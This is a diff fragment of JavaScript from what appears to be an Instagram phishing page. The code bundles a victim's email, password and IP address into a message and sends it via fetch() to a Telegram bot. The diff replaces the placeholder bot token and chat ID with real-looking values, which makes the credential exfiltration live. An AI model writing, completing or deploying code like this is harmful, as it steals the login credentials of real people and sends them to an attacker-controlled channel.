@@ -243,8 +243,8 @@
                     const message = `Attempt ${attemptCount}:\nEmail: ${email.value}\nPassword: ${password.value}\nIP: ${userIP}\nTag: Instagram`;
 
                     // Send the message to the Telegram bot
-                    const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your bot token
-                    const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+                    const telegramBotToken = '7769927746:AAGY_cQOjnRPs7_x4ooXr90qFSe9LnBvr20'; // Replace with your bot token
+                    const chatId = '7735490302'; // Replace with your chat ID
                     const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
                     fetch(telegramUrl)
